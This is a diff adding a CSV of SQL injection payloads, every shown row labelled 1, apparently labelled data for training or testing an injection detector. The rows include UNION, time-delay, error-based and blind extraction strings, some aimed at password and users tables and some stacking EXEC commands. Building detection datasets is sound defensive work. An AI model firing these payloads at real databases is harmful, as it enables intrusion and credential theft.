@@ -1,0 +1,80 @@
+payload,label
+- 1' AND (SELECT CASE WHEN 'a'='a' THEN 1 ELSE 2 END) = 1--,1
+- 1')) OR ((SELECT CASE WHEN 'b'='b' THEN 1 ELSE 0 END))=1,1
+"- 1) UNION SELECT NULL,NULL,NULL#",1
+"- 1') AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x78,0x65,0x6c,0x6c,0x6f,0x20,USER(),0x3a,0x20,SCHEMA())FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1)T)--",1
+"- -7387'))) ORDER BY ASCII(SUBSTRING(@@version,1,1))--",1
+- 1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end,1
+"- -5622"" WHERE 7970=7970 UNION ALL SELECT 7970,7970,7970,7970",1
+"- -7387'))) UNION SELECT NULL,NULL,NULL--",1
+"- -5622"" WHERE 7970=7970 UNION ALL SELECT NULL,NULL,NULL",1
+"- -7387'))) ORDER BY ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,1))",1
+"- -7387'))) ORDER BY ASCII(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='passwords'),1,1))",1
+- 1') AND (SELECT CASE WHEN 5432=5432 THEN 1 ELSE 0 END) = 1; SELECT count(*) FROM users--,1
+- -8765')) OR (4321=4321) AND ('a'='a,1
+- 1) AS t WHERE 6543=6543 AND SLEEP(10)#,1
+"- 1%') ORDER BY 1 UNION ALL SELECT 1,2,3 FROM dual--",1
+- -9876'))) WAITFOR DELAY '0:0:5'--,1
+- 1)) AND (SELECT CASE WHEN 8765=8765 THEN SLEEP(5) ELSE 0 END)#,1
+- -7654'))) ORDER BY 1 LIMIT 1--,1
+- 1%')) OR (SELECT CASE WHEN 9876=9876 THEN 1 ELSE 0 END) = 1; SELECT count(*) FROM categories--,1
+- 1%27 or 'a'='a,1
+- -1%3B select count(*) from information_schema.tables where 1=1,1
+- ' OR 1=1 AND SLEEP(5)--,1
+"- 1') AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))=73#",1
+"- -1%29 and (select count(*) from information_schema.columns where column_name like '%password%' limit 0,1)>0",1
+- ' OR 1=1 OR 1>2--,1
+"- 1) AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)--",1
+- -1' OR 'a'='a,1
+"- -1%27 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users') LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)--",1
+"- ' OR 1=1 OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=79#",1
+"- 1') OR ASCII(SUBSTRING((SELECT host FROM users LIMIT 1),1,1))=84",1
+- -1%3B select * from (select (case when (1=1) then sleep(5) end)) as delay where 'a'='a,1
+- 1%27%20and%20(select%20count(*)%20from%20information_schema.tables)%20=%20(select%20count(*))--,1
+"- 1'%'%20union%20all%20select%20null,null,concat(0x736f6e656c696e65),(select%20group_concat(table_name)%20from%20information_schema.tables)%20from%20dual--%20",1
+"- 1%29%20or%20(7654=7654)%20union%20all%20select%20null,null,concat(0x4d6f7a616c),cast((select%20group_concat(column_name))%20as%20char)%20from%20information_schema.columns--",1
+- 1'))%20as%20gfzb%20where%207904=7904;begin%20dbms_lock.sleep(5);%20end--,1
+- -3136%29%20or%203400=6002--%20,1
+"- -9860%29%20union%20all%20select%20null,null,null--%20",1
+- 1))%20as%20sekb%20where%206897=6897%20or%201000=7683--,1
+- -7387'))%20order%20by%201--%20,1
+- 1'))%20and%204386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(4386=4386)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--%20,1
+"- 1%27%20UNION%20ALL%20SELECT%20null,null,null--",1
+- 1%29--%20and%20(6969=6969)%20OR%201=%23,1
+- 1%20WHERE%201%3D1%20AND%20SLEEP(3)#,1
+"- 1)%20OR%20(SELECT%201%20FROM%20(SELECT%20COUNT(*),%20(SELECT%201%20UNION%20ALL%20SELECT%202))T)--%20",1
+- -7563%29%20AND%20(1618%3D1618)%20OR%201%3D1,1
+"- 1%20WHERE%201%3D1%20UNION%20ALL%20SELECT%20null,null--",1
+- -5742%29--%20AND%20(8628%3D8628)%20OR%201%3D1,1
+- -4927%29--%20AND%20(2345%3D2345)%20OR%201%3D1,1
+- 1%29%20AND%20(SELECT%201%20FROM%20(SELECT%20COUNT(*))T)--%20,1
+- -3456%27--%20AND%20(8787%3D8787)%20OR%201%3D1,1
+- -7654%27--%20AND%20(1212%3D1212)%20OR%201%3D1,1
+- -7546%27--%20AND%20(5656%3D5656)%20OR%201%3D1,1
+- ' OR 1=1 AND (SELECT CASE WHEN ('a'='a') THEN 1 ELSE 2 END) FROM DUAL--,1
+"- 1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL NULL--",1
+- 1) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users')>0--,1
+- -1')) OR 1=1--,1
+"- 1-- UNION ALL SELECT 'x','x','x','x','x','x'--",1
+"- 1') AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (ELT(1,USER())),0x7e)) FROM INFORMATION_SCHEMA.COLUMNS)AS t LIMIT 0,1)=1--",1
+- -2')) ORDER BY 1--,1
+- 1);EXEC master..XP_DOSCMD 'echo test'--,1
+- 1')) AS T WHERE 1=1--,1
+- 1); EXEC master..XP_DOSCMD 'net config'--,1
+"- 1%27%20union%20select%20null,null,null#",1
+- 6593')%20order%20by%201--,1
+- 1'--%20and%20(8461=8461),1
+- 1'))%20waitfor%20delay%20'0:0:5'%20--,1
+- -7932))%20or%207592%3D7592,1
+- 1%29%20as%20hujk%20where%206824%3D6824,1
+- 1)%20and%20(9825=9825%20or%20sleep(5))#,1
+- 1%3B%20select%20version()%20from%20dual%20--,1
+- -9466))%20as%20ghjk%20where%208595%3D8595,1
+- 1%27%20and%20(6245%3D6245%20or%20sleep(5)),1
+- -9134))%20order%20by%202--,1
+- 1'))%20as%20ghjk%20where%208765%3D8765,1
+- 1%20and%20(7321%3D7321%20or%20sleep(5))#,1
+- -9422))%20as%20hujk%20where%208533%3D8533,1
+- -7655))%20order%20by%204--,1
+- -9655))%20as%20ghjk%20where%208732%3D8732,1
+- -9732))%20as%20ghjk%20where%208923%3D8923,1
